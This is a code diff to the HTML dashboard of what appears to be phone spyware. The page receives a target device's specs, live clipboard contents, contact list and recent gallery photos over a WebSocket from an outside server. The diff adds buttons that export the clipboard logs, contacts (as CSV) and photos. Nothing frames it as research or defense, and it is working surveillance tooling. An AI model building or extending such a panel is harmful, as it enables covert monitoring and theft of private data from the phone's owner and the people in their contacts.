@@ -8,14 +8,20 @@
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #f8fafc; margin: 0; padding: 20px; }
         .container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; max-width: 1400px; margin: auto; }
         .card { background: #1e293b; padding: 20px; border-radius: 14px; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
-        h2 { margin-top: 0; color: #38bdf8; font-size: 1.1rem; border-bottom: 1px solid #334155; padding-bottom: 10px; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; }
+        h2 { margin: 0; color: #38bdf8; font-size: 1.1rem; }
         
+        .btn-download { background: #0284c7; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-weight: bold; }
+        .btn-download:hover { background: #0284c7dd; }
+
         .info-box, .logs-box { font-family: monospace; background: #0f172a; padding: 12px; border-radius: 8px; height: 160px; overflow-y: auto; color: #4ade80; font-size: 0.9rem; }
         .item-row { margin-bottom: 6px; border-bottom: 1px solid #1e293b; padding-bottom: 4px; }
 
-        .gallery-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; max-height: 200px; overflow-y: auto; padding-right: 5px; }
-        .gallery-grid img { width: 100%; height: 80px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 2px solid transparent; transition: 0.2s; }
-        .gallery-grid img:hover { border-color: #38bdf8; transform: scale(1.03); }
+        .gallery-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; max-height: 220px; overflow-y: auto; padding-right: 5px; }
+        .gallery-item { background: #0f172a; padding: 6px; border-radius: 8px; text-align: center; }
+        .gallery-item img { width: 100%; height: 75px; object-fit: cover; border-radius: 6px; cursor: pointer; transition: 0.2s; }
+        .gallery-item img:hover { transform: scale(1.03); }
+        .gallery-item a { display: block; margin-top: 6px; color: #38bdf8; font-size: 0.75rem; text-decoration: none; font-weight: bold; }
 
         .chat-section { grid-column: span 2; display: flex; flex-direction: column; height: 320px; }
         .chat-box { flex: 1; overflow-y: auto; background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 8px; }
@@ -35,25 +41,36 @@
     <div class="container">
         <!-- Device Info & Battery -->
         <div class="card">
-            <h2>Device & Battery Info</h2>
+            <div class="card-header">
+                <h2>Device & Battery Info</h2>
+            </div>
             <div class="info-box" id="deviceInfoBox">Waiting for device specs...</div>
         </div>
 
         <!-- Clipboard Monitoring -->
         <div class="card">
-            <h2>Live Clipboard (Copied Text)</h2>
+            <div class="card-header">
+                <h2>Live Clipboard</h2>
+                <button class="btn-download" onclick="downloadLogs('clipboardBox', 'clipboard_logs.txt')">Download Logs</button>
+            </div>
             <div class="logs-box" id="clipboardBox">Waiting for clipboard activity...</div>
         </div>
 
         <!-- Contacts List -->
         <div class="card" style="grid-column: span 2;">
-            <h2>Synced Phone Contacts</h2>
+            <div class="card-header">
+                <h2>Synced Phone Contacts</h2>
+                <button class="btn-download" onclick="downloadContacts()">Download Contacts CSV</button>
+            </div>
             <div class="logs-box" id="contactsBox" style="height: 140px;">Fetching contacts...</div>
         </div>
 
         <!-- Gallery Sync (Last 5 Days) -->
         <div class="card" style="grid-column: span 2;">
-            <h2>Synced Gallery (Last 5 Days Photos - Click to send in chat)</h2>
+            <div class="card-header">
+                <h2>Synced Gallery (Last 5 Days Photos)</h2>
+                <span style="font-size: 0.85rem; color: #94a3b8;">Click image to send in chat or download individually</span>
+            </div>
             <div class="gallery-grid" id="galleryContainer">
                 <p style="color: #94a3b8; grid-column: span 4; text-align: center;">Fetching phone gallery...</p>
             </div>
@@ -61,7 +78,9 @@
 
         <!-- Chat Panel -->
         <div class="card chat-section">
-            <h2>Comfortable Chat & Media Sharing</h2>
+            <div class="card-header">
+                <h2>Comfortable Chat & Media Sharing</h2>
+            </div>
             <div class="chat-box" id="chatMessages"></div>
             <div class="chat-input-row">
                 <input type="text" id="msgInput" placeholder="Type a message or click photo from gallery..." onkeypress="handleKeyPress(event)" />
@@ -72,6 +91,7 @@
 
     <script>
         const ws = new WebSocket('wss://liveapp-uo4s.onrender.com');
+        let globalContacts = [];
 
         ws.onmessage = (event) => {
             const data = JSON.parse(event.data);
@@ -94,9 +114,10 @@
             }
 
             if (data.type === 'CONTACTS_SYNC') {
+                globalContacts = data.contacts;
                 const box = document.getElementById('contactsBox');
                 box.innerHTML = '';
-                data.contacts.forEach(c => {
+                globalContacts.forEach(c => {
                     const div = document.createElement('div');
                     div.className = 'item-row';
                     div.innerText = `${c.name} : ${c.phone}`;
@@ -107,11 +128,22 @@
             if (data.type === 'GALLERY_SYNC') {
                 const container = document.getElementById('galleryContainer');
                 container.innerHTML = '';
-                data.photos.forEach(photoUri => {
+                data.photos.forEach((photoUri, index) => {
+                    const itemDiv = document.createElement('div');
+                    itemDiv.className = 'gallery-item';
+                    
                     const img = document.createElement('img');
                     img.src = photoUri;
                     img.onclick = () => sendMediaMessage(photoUri);
-                    container.appendChild(img);
+                    
+                    const downloadLink = document.createElement('a');
+                    downloadLink.href = photoUri;
+                    downloadLink.download = `photo_${index + 1}.jpg`;
+                    downloadLink.innerText = 'Download';
+
+                    itemDiv.appendChild(img);
+                    itemDiv.appendChild(downloadLink);
+                    container.appendChild(itemDiv);
                 });
             }
 
@@ -155,6 +187,42 @@
             
             chatBox.appendChild(div);
             chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        // Download Helper Functions
+        function downloadContacts() {
+            if (!globalContacts.length) {
+                alert('No contacts available to download yet.');
+                return;
+            }
+            let csvContent = 'data:text/csv;charset=utf-8,Name,Phone Number\n';
+            globalContacts.forEach(c => {
+                csvContent += `"${c.name}","${c.phone}"\n`;
+            });
+            const encodedUri = encodeURI(csvContent);
+            const link = document.createElement('a');
+            link.setAttribute('href', encodedUri);
+            link.setAttribute('download', 'synced_contacts.csv');
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function downloadLogs(boxId, filename) {
+            const textContent = document.getElementById(boxId).innerText;
+            if (!textContent || textContent.includes('Waiting')) {
+                alert('No logs available to download yet.');
+                return;
+            }
+            const blob = new Blob([textContent], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
         }
     </script>
 </body>
